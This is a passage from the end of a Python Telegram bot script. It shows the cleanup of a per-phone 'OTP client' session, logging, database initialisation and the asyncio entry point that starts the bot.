                    "━━━━━━━━━━━━━━━━━━━━",
                    parse_mode="html"
                )

            await asyncio.sleep(900)
        except Exception as e:
            logger.error(f"OTP Client Error for {phone}: {e}")
        finally:
            try:
                await client.disconnect()
            except Exception:
                pass
            otp_clients_ref.pop(phone, None)

    # ------------------------------------------------------------------
    # START
    # ------------------------------------------------------------------
    try:
        init_db()
        logger.info("--- Bot Started Successfully ---")
        await bot.run_until_disconnected()
    except Exception as e:
        logger.critical(f"Crashed: {e}\n{traceback.format_exc()}")

# ------------------------------------------------------------------
# ENTRY
# ------------------------------------------------------------------
if __name__ == "__main__":
    asyncio.run(main())
